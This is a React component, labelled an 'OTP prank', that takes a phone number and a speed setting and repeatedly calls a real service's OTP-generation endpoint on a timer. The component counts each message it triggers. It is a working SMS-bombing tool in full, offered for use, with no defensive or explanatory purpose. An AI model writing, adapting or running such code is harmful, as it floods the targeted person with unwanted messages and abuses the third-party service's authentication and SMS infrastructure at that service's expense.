import React, { useState, useEffect, useRef } from 'react'
import axios from 'axios'

const SendOtpComponent = () => {
  const [mobileNo, setMobileNo] = useState('')
  const [speed, setSpeed] = useState(2000) // Default speed is 2000ms (2 seconds)
  const [errors, setErrors] = useState({})
  const [number, setNumber] = useState(0)
  const [isSending, setIsSending] = useState(false)
  const timerRef = useRef(null)

  const validateInputs = () => {
    const newErrors = {}
    if (!mobileNo.trim()) {
      newErrors.mobileNo = 'Enter Number'
    }
    if (isNaN(speed) || speed <= 0) {
      newErrors.speed = 'Speed must be a positive number'
    }
    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const startTimer = () => {
    if (timerRef.current) {
      clearInterval(timerRef.current)
    }

    setIsSending(true)

    timerRef.current = setInterval(() => {
      const payload = {
        mobile_no: mobileNo,
      }

      axios
        .post('https://portallapp.com/api/v1/auth/generate-otp', payload)
        .then((response) => {
          console.log('OTP generated:', response.data)
        })
        .catch((error) => {
          console.error('Error generating OTP:', error)
        })

      setNumber((prevNumber) => prevNumber + 1)
    }, speed)
  }

  const handleSubmit = (e) => {
    e.preventDefault()
    if (validateInputs()) {
      setNumber(0)
      startTimer()
    }
  }

  // Function to stop sending OTPs manually
  const stopSending = () => {
    if (timerRef.current) {
      clearInterval(timerRef.current)
      timerRef.current = null
      setIsSending(false)
    }
  }

  useEffect(() => {
    return () => {
      if (timerRef.current) {
        clearInterval(timerRef.current)
      }
    }
  }, [])

  return (
    <div style={styles.container}>
      <h2>Send OTP Prank By Xhahzad Bhai!</h2>
      <form onSubmit={handleSubmit} style={styles.form}>
        <div style={styles.inputGroup}>
          <label htmlFor="mobileNo" style={styles.label}>
            Mobile Number:
          </label>
          <input
            type="text"
            id="mobileNo"
            value={mobileNo}
            onChange={(e) => setMobileNo(e.target.value)}
            style={styles.input}
            disabled={isSending}
            placeholder="Enter mobile number Without Zero."
          />
          {errors.mobileNo && (
            <span style={styles.error}>{errors.mobileNo}</span>
          )}
        </div>

        <div style={styles.inputGroup}>
          <label htmlFor="speed" style={styles.label}>
            Speed (ms):
          </label>
          <input
            type="number"
            id="speed"
            value={speed}
            onChange={(e) => setSpeed(e.target.value)}
            style={styles.input}
            disabled={isSending}
            placeholder="Enter speed in milliseconds"
          />
          {errors.speed && <span style={styles.error}>{errors.speed}</span>}
        </div>

        <button type="submit" style={styles.button} disabled={isSending}>
          {isSending ? 'Sending OTPs...' : 'Start Sending OTP'}
        </button>

        {isSending && (
          <button
            type="button"
            style={styles.stopButton} // Stop button styles
            onClick={stopSending} // Stop function triggered here
          >
            Stop Sending OTPs
          </button>
        )}
      </form>

      <div style={styles.status}>
        <p>Number of OTPs sent: {number}</p>
        {isSending && <p style={styles.sending}>Sending OTPs...</p>}
      </div>
    </div>
  )
}

// Basic styles for the component
const styles = {
  container: {
    maxWidth: '500px',
    margin: '50px auto',
    padding: '30px',
    border: '1px solid #ccc',
    borderRadius: '8px',
    fontFamily: 'Arial, sans-serif',
    backgroundColor: '#f9f9f9',
  },
  form: {
    display: 'flex',
    flexDirection: 'column',
  },
  inputGroup: {
    marginBottom: '20px',
  },
  label: {
    marginBottom: '8px',
    display: 'block',
    fontWeight: 'bold',
  },
  input: {
    padding: '10px',
    fontSize: '16px',
    width: '100%',
    boxSizing: 'border-box',
    borderRadius: '4px',
    border: '1px solid #ccc',
  },
  error: {
    color: 'red',
    marginTop: '5px',
    fontSize: '14px',
  },
  button: {
    padding: '12px',
    fontSize: '16px',
    backgroundColor: '#28a745',
    color: '#FFF',
    border: 'none',
    borderRadius: '4px',
    cursor: 'pointer',
    marginBottom: '10px',
  },
  stopButton: {
    padding: '12px',
    fontSize: '16px',
    backgroundColor: '#dc3545',
    color: '#FFF',
    border: 'none',
    borderRadius: '4px',
    cursor: 'pointer',
  },
  status: {
    marginTop: '20px',
    textAlign: 'center',
  },
  sending: {
    color: '#007bff',
    fontWeight: 'bold',
  },
}

export default SendOtpComponent
